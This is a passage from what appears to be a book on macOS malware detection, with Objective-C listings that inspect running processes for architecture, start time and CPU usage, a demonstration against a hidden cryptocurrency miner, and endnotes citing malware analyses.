&#13;
<pre><code>% <b>file DazzleSpy/softwareupdate</b>&#13;
DazzleSpy/softwareupdate: Mach-O 64-bit executable <b>x86_64</b>&#13;
</code></pre>&#13;
<p class="TX">For this reason, you might want to look a little more closely at Intel binaries than at ARM or universal binaries.</p>&#13;
<p class="TX">Unfortunately, identifying architecture information is not as straightforward as simply checking the host’s CPU type, because on Apple Silicon systems, Intel binaries can still execute, albeit translated via Rosetta. Instead, you can follow the process taken by Activity Monitor. <a href="chapter1.xhtml#Lis1-34">Listing 1-34</a> shows this approach, which you can find in the <span class="SANS_TheSansMonoCd_W5Regular_11">getArchitecture</span> function in the <i>enumerateProcesses</i> project.</p>&#13;
<span id="Lis1-34"/>&#13;
<pre><code>enum Architectures{ArchUnknown, ArchAppleSilicon, ArchIntel};&#13;
&#13;
NSUInteger getArchitecture(pid_t pid) {&#13;
    NSUInteger architecture = ArchUnknown;&#13;
    cpu_type_t type = -1;&#13;
    size_t size = 0;&#13;
    int mib[CTL_MAXNAME] = {0};&#13;
    size_t length = CTL_MAXNAME;&#13;
    struct kinfo_proc procInfo = {0};&#13;
&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> sysctlnametomib("sysctl.proc_cputype", mib, &amp;length);&#13;
    mib[length++] = pid;&#13;
&#13;
    size = sizeof(cpu_type_t);&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> sysctl(mib, (u_int)length, &amp;type, &amp;size, 0, 0);&#13;
&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> if(CPU_TYPE_X86_64 == type) {&#13;
        architecture = ArchIntel;&#13;
    } else if(CPU_TYPE_ARM64 == type) {&#13;
      <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> architecture = ArchAppleSilicon;&#13;
        mib[0] = CTL_KERN;&#13;
        mib[1] = KERN_PROC;&#13;
        mib[2] = KERN_PROC_PID;&#13;
        mib[3] = pid;&#13;
        size = sizeof(procInfo);&#13;
&#13;
        sysctl(mib, 4, &amp;procInfo, &amp;size, NULL, 0);&#13;
      <span class="Code_CodeAnnotation" aria-label="annotation5">❺</span> if(P_TRANSLATED == (P_TRANSLATED &amp; procInfo.kp_proc.p_flag)) {&#13;
            architecture = ArchIntel;&#13;
        }&#13;
    }&#13;
    return architecture;&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-34: Obtaining a process’s architecture</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_34" aria-label="34"/>This code, as well as Activity Monitor, first uses the <span class="SANS_TheSansMonoCd_W5Regular_11">"proc_cputype"</span> string and the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctlnametomib</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> APIs to determine a running process’s CPU type. Note that the array passed to <i>sysctlnametomib</i> has a size of <span class="SANS_TheSansMonoCd_W5Regular_11">CTL_MAXNAME</span>, a constant defined by Apple that defines the maximum number of components in an MIB name. If the answer is Intel (<span class="SANS_TheSansMonoCd_W5Regular_11">CPU_TYPE_X86_64</span>), you know the process is running as <span class="SANS_TheSansMonoCd_W5Regular_11">x86_64</span>. However, on Apple Silicon systems, these processes could still be backed by an Intel-based binary that was translated into ARM via Rosetta. To detect this scenario, Apple checks the process’s <span class="SANS_TheSansMonoCd_W5Regular_11">p_flag</span>s (obtained by a call to <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span>). If these flags have the <span class="SANS_TheSansMonoCd_W5Regular_11">P_TRANSLATED</span> bit set, Activity Monitor sets the architecture to Intel.</p>&#13;
<p class="TX">In the <i>enumerateProcesses</i> project, you’ll find a function named <span class="SANS_TheSansMonoCd_W5Regular_11">getArchitecture</span>. It takes a process ID and returns its architecture. First, we populate an array via the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctlnametomib</span> API, passing in the name <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl.proc_cputype</span> <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Then, after adding the target process ID, we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> API with the initialized array to get the CPU type of said process <span class="CodeAnnotation" aria-label="annotation2">❷</span>. If the returned CPU type is <span class="SANS_TheSansMonoCd_W5Regular_11">CPU_TYPE_X86_64</span>, the code sets the architecture to Intel <span class="CodeAnnotation" aria-label="annotation3">❸</span>. On the other hand, if the CPU type for the target process is <span class="SANS_TheSansMonoCd_W5Regular_11">CPU _TYPE_ARM64</span>, the code defaults to Apple Silicon <span class="CodeAnnotation" aria-label="annotation4">❹</span>. As noted, the process could still be an Intel-based binary, albeit translated. To detect this scenario, the code checks whether the process’s <span class="SANS_TheSansMonoCd_W5Regular_11">p_flag</span>s have the <span class="SANS_TheSansMonoCd_W5Regular_11">P_TRANSLATED</span> bit set. If so, it sets the architecture to Intel <span class="CodeAnnotation" aria-label="annotation5">❺</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec21">&#13;
&#13;
<h4 class="H2" id="sec21"><span id="h2-15"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Start Time</span></h4>&#13;
<p class="TNI">When querying running processes, you may find it useful to know when each process was started. This can help determine if a process was started automatically during system boot or later, perhaps by the user. Processes started automatically may be persistently installed, and if these don’t belong to the operating system, you may want to closely examine them.</p>&#13;
<p class="TX">To determine a process’s start time, we can once again turn to the trusty <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> API. <a href="chapter1.xhtml#Lis1-35">Listing 1-35</a> shows the <span class="SANS_TheSansMonoCd_W5Regular_11">getStartTime</span> function in the <i>enumerateProcesses</i> project, which accepts a process ID and returns the process’s start time.</p>&#13;
<span id="Lis1-35"/>&#13;
<pre><code>NSDate* getStartTime(pid_t pid) {&#13;
    NSDate* startTime = nil;&#13;
    struct timeval timeVal = {0};&#13;
    struct kinfo_proc processStruct = {0};&#13;
    size_t procBufferSize = sizeof(processStruct);&#13;
&#13;
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, pid};&#13;
&#13;
    sysctl(mib, 4, &amp;processStruct, &amp;procBufferSize, NULL, 0); <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
    timeVal = processStruct.kp_proc.p_un.__p_starttime; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
    return [NSDate dateWithTimeIntervalSince1970:timeVal.tv_sec + timeVal.tv_usec / 1.0e6]; <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-35: Obtaining the start time of a process</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_35" aria-label="35"/>We invoke <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> to populate a <span class="SANS_TheSansMonoCd_W5Regular_11">kinfo_proc</span> structure for a process <span class="CodeAnnotation" aria-label="annotation1">❶</span>. This structure will contain a <span class="SANS_TheSansMonoCd_W5Regular_11">timeval</span> struct aptly named <span class="SANS_TheSansMonoCd_W5Regular_11">p_starttime</span> <span class="CodeAnnotation" aria-label="annotation2">❷</span>. We then convert this Unix timestamp into a more manageable date object that we return to the caller <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec22">&#13;
&#13;
<h4 class="H2" id="sec22"><span id="h2-16"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">CPU Utilization</span></h4>&#13;
<p class="TNI">Let’s end the chapter by looking at how to compute CPU utilization for a given process. Although this isn’t a foolproof heuristic, it may help detect surreptitious cryptocurrency miners, which tend to maximize their use of system resources.</p>&#13;
<p class="TX">To compute CPU utilization, start by invoking the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pid_rusage</span> API, which returns usage information for a given process ID. This API is declared in <i>libproc.h</i> as follows:</p>&#13;
&#13;
<pre><code>int proc_pid_rusage(int pid, int flavor, rusage_info_t* buffer);</code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">flavor</span> argument can be set to the constant <span class="SANS_TheSansMonoCd_W5Regular_11">RUSAGE_INFO_V0</span>, and the final argument is an output buffer to a resource information buffer, which should be of type <span class="SANS_TheSansMonoCd_W5Regular_11">rusage_info_v0</span>.</p>&#13;
<p class="TX">In <a href="chapter1.xhtml#Lis1-36">Listing 1-36</a>, from the <span class="SANS_TheSansMonoCd_W5Regular_11">getCPUUsage</span> function in the <i>enumerateProcesses</i> project, we invoke <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pid_rusage</span> twice with a delay (<span class="SANS_TheSansMonoCd_W5Regular_11">delta</span>) between invocations. Then we compute the difference between the resource information of the first and second calls. This code was inspired by a post on Stack Overflow.<sup><a role="doc-noteref" id="chapter1_16" href="#chapter1-16">16</a></sup></p>&#13;
<span id="Lis1-36"/>&#13;
<pre><code>struct rusage_info_v0 resourceInfo_1 = {0};&#13;
struct rusage_info_v0 resourceInfo_2 = {0};&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> proc_pid_rusage(pid, RUSAGE_INFO_V0, (rusage_info_t*)&amp;resourceInfo_1);&#13;
&#13;
sleep(delta);&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> proc_pid_rusage(pid, RUSAGE_INFO_V0, (rusage_info_t*)&amp;resourceInfo_2);&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> int64_t cpuTime = (resourceInfo_2.ri_user_time - resourceInfo_1.ri_user_time)&#13;
+ (resourceInfo_2.ri_system_time - resourceInfo_1.ri_system_time);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-36: Computing the CPU time of a process over a delta of five seconds</span></p>&#13;
<p class="TX">You can see the first call to <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pid_rusage</span> at <span class="CodeAnnotation" aria-label="annotation1">❶</span>, followed by another call at <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Both calls take the same process ID of the target process. We then compute the CPU time by subtracting both the user time (<span class="SANS_TheSansMonoCd_W5Regular_11">ri_user_time</span>) and system time (<span class="SANS_TheSansMonoCd_W5Regular_11">ri_system_time</span>), then adding the results <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
<p class="TX">To compute the CPU <i>percentage</i> in use, we first convert this CPU time from Mach time to nanoseconds. <a href="chapter1.xhtml#Lis1-37">Listing 1-37</a> does this with the help of the <span class="SANS_TheSansMonoCd_W5Regular_11">mach_timebase_info</span> function.</p>&#13;
<span id="Lis1-37"/>&#13;
<pre><code>double cpuUsage = 0.0f;&#13;
mach_timebase_info_data_t timebase = {0};&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_36" aria-label="36"/>mach_timebase_info(&amp;timebase);&#13;
cpuTime = (cpuTime * timebase.numer) / timebase.denom;&#13;
&#13;
cpuUsage = (double)cpuTime / delta / NSEC_PER_SEC * 100;&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-37: Calculating a percentage of CPU usage</span></p>&#13;
<p class="TX">We then divide the CPU time by the specified delay and the number of nanoseconds per second times 100 (as we want a percentage).<sup><a role="doc-noteref" id="chapter1_17" href="#chapter1-17">17</a></sup></p>&#13;
<p class="TX">Let’s now run <i>enumerateProcesses</i>, which contains this code, against the unauthorized cryptocurrency miner found in the Calendar 2 application mentioned earlier in this chapter:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
...&#13;
(1641):/Applications/CalendarFree.app/Contents/MacOS/CalendarFree&#13;
...&#13;
CPU usage: 370.750173%&#13;
</code></pre>&#13;
<p class="TX">As the application is surreptitiously mining, its CPU utilization is a whopping 370 percent! (On multicore CPUs, CPU utilization can reach values over 100 percent.) We can confirm the accuracy of the program by running the built-in macOS <span class="SANS_TheSansMonoCd_W5Regular_11">ps</span> tool, specifying the PID of the Calendar application:</p>&#13;
&#13;
<pre><code>% <b>ps u -p 1641</b>&#13;
USER   PID      %CPU ...&#13;
user   1641     372.4 ...&#13;
</code></pre>&#13;
<p class="TX">Although the exact percentage will drift over time, <span class="SANS_TheSansMonoCd_W5Regular_11">ps</span> shows the application using roughly the same massive amount of CPU.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="conclusion" role="doc-conclusion" aria-labelledby="sec23">&#13;
&#13;
<h3 class="H1" id="sec23"><span id="h1-17"/><span class="SANS_Futura_Std_Bold_B_11">Conclusion</span></h3>&#13;
<p class="TNI">In this chapter, you saw how to extract a myriad of useful information from running processes, including process hierarchies, code information, and much more. With this information, you should be well on your way to detecting any malware running on a macOS system. In the next chapter, we’ll focus on programmatically parsing and analyzing the Mach-O executable binary that backs each process.</p>&#13;
</section>&#13;
<section epub:type="rearnotes" role="doc-endnotes" aria-labelledby="sec24">&#13;
&#13;
<h3 class="H1" id="sec24"><span class="SANS_Futura_Std_Bold_B_11">Notes</span></h3>&#13;
<ol class="footnotes">&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-1" href="#chapter1_1">  1</a></span>.  To learn more about audit tokens, see Scott Knight, “Audit Tokens Explained,” Knight.sc, March 20, 2020, <a href="https://knight.sc/reverse%20engineering/2020/03/20/audit-tokens-explained.html"><i>https://<wbr/>knight<wbr/>.sc<wbr/>/reverse%20engineering<wbr/>/2020<wbr/>/03<wbr/>/20<wbr/>/audit<wbr/>-tokens<wbr/>-explained<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-2" href="#chapter1_2">  2</a></span>.  Patrick Wardle, “Analyzing OSX.DazzleSpy,” Objective-See, January 25, 2022, <a href="https://objective-see.org/blog/blog_0x6D.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x6D<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_37" aria-label="37"/><span class="en_tx"><a id="chapter1-3" href="#chapter1_3">  3</a></span>.  Patrick Wardle, “Ironing Out (the macOS) Details of a Smooth Operator (Part II),” Objective-See, April 1, 2023, <a href="https://objective-see.org/blog/blog_0x74.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x74<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-4" href="#chapter1_4">  4</a></span>.  Patrick Wardle, “Discharging ElectroRAT,” Objective-See, January 5, 2021, <a href="https://objective-see.org/blog/blog_0x61.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x61<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-5" href="#chapter1_5">  5</a></span>.  Aedan Russel, “ChromeLoader: A Pushy Malvertiser,” Red Canary, May 25, 2022, <a href="https://redcanary.com/blog/chromeloader/"><i>https://<wbr/>redcanary<wbr/>.com<wbr/>/blog<wbr/>/chromeloader<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-6" href="#chapter1_6">  6</a></span>.  Mitch Datka, “CrowdStrike Uncovers New MacOS Browser Hijacking Campaign,” <i>CrowdStrike</i>, June 2, 2022, <a href="https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/"><i>https://<wbr/>www<wbr/>.crowdstrike<wbr/>.com<wbr/>/blog<wbr/>/how<wbr/>-crowdstrike<wbr/>-uncovered<wbr/>-a<wbr/>-new<wbr/>-macos<wbr/>-browser<wbr/>-hijacking<wbr/>-campaign<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-7" href="#chapter1_7">  7</a></span>.  Patrick Wardle, “A Surreptitious Cryptocurrency Miner in the Mac App Store?,” Objective-See, March 11, 2018, <a href="https://objective-see.org/blog/blog_0x2B.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x2B<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-8" href="#chapter1_8">  8</a></span>.  See “App Review Guidelines,” Apple, <a href="https://developer.apple.com/app-store/review/guidelines/"><i>https://<wbr/>developer<wbr/>.apple<wbr/>.com<wbr/>/app<wbr/>-store<wbr/>/review<wbr/>/guidelines<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-9" href="#chapter1_9">  9</a></span>.  Patrick Wardle, “Where There Is Love, There Is . . . Malware?” Objective-See, February 14, 2023, <a href="https://objective-see.org/blog/blog_0x72.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x72<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-10" href="#chapter1_10">10</a></span>.  For more details about this attack, including a full analysis of the payload, see my blog post, “The Mac Malware of 2019: OSX.Yort,” Objective-See, January 1, 2020, <a href="https://objective-see.org/blog/blog_0x53.html#osx-yort"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x53<wbr/>.html#osx<wbr/>-yort</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-11" href="#chapter1_11">11</a></span>.  To learn more about process trees on macOS, see Jaron Bradley, “Grafting Apple Trees: Building a Useful Process Tree,” presented at Objective by the Sea, Maui, HI, March 12, 2020, <a href="https://objectivebythesea.org/v3/talks/OBTS_v3_jBradley.pdf"><i>https://<wbr/>objectivebythesea<wbr/>.org<wbr/>/v3<wbr/>/talks<wbr/>/OBTS<wbr/>_v3<wbr/>_jBradley<wbr/>.pdf</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-12" href="#chapter1_12">12</a></span>.  Jonathan Levin, “launchd, I’m Coming for You,” October 7, 2015, <a href="http://newosxbook.com/articles/jlaunchctl.html"><i>http://<wbr/>newosxbook<wbr/>.com<wbr/>/articles<wbr/>/jlaunchctl<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-13" href="#chapter1_13">13</a></span>.  See <a href="https://objective-see.com/products/taskexplorer.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.com<wbr/>/products<wbr/>/taskexplorer<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-14" href="#chapter1_14">14</a></span>.  For more on this topic, see Zhuowei Zhang, “Extracting Libraries from dyld_shared_cache,” <i>Worth Doing Badly</i>, June 24, 2018, <a href="https://worthdoingbadly.com/dscextract/"><i>https://<wbr/>worthdoingbadly<wbr/>.com<wbr/>/dscextract<wbr/>/</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-15" href="#chapter1_15">15</a></span>.  Patrick Wardle, “Tearing Apart the Undetected (OSX)Coldroot RAT,” Objective-See, February 17, 2018, <a href="https://objective-see.org/blog/blog_0x2A.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x2A<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-16" href="#chapter1_16">16</a></span>.  “The cpu_time Obtained by proc_pid_rusage Does Not Meet Expectations on the macOS M1 Chip,” Stack Overflow, <a href="https://stackoverflow.com/questions/66328149/the-cpu-time-obtained-by-proc-pid-rusage-does-not-meet-expectations-on-the-macos"><i>https://<wbr/>stackoverflow<wbr/>.com<wbr/>/questions<wbr/>/66328149<wbr/>/the<wbr/>-cpu<wbr/>-time<wbr/>-obtained<wbr/>-by<wbr/>-proc<wbr/>-pid<wbr/>-rusage<wbr/>-does<wbr/>-not<wbr/>-meet<wbr/>-expectations<wbr/>-on<wbr/>-the<wbr/>-macos</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter1-17" href="#chapter1_17">17</a></span>.  You can read more about the topic of Mach time and conversions to nanoseconds in Howard Oakley, “Changing the Clock in Apple Silicon Macs,” <i>The Eclectic Light Company</i>, September 8, 2020, <a href="https://eclecticlight.co/2020/09/08/changing-the-clock-in-apple-silicon-macs/"><i>https://<wbr/>eclecticlight<wbr/>.co<wbr/>/2020<wbr/>/09<wbr/>/08<wbr/>/changing<wbr/>-the<wbr/>-clock<wbr/>-in<wbr/>-apple<wbr/>-silicon<wbr/>-macs<wbr/>/</i></a>.</p></li>&#13;
</ol>&#13;
</section>&#13;
</section>&#13;
</div>
</div>
</body></html>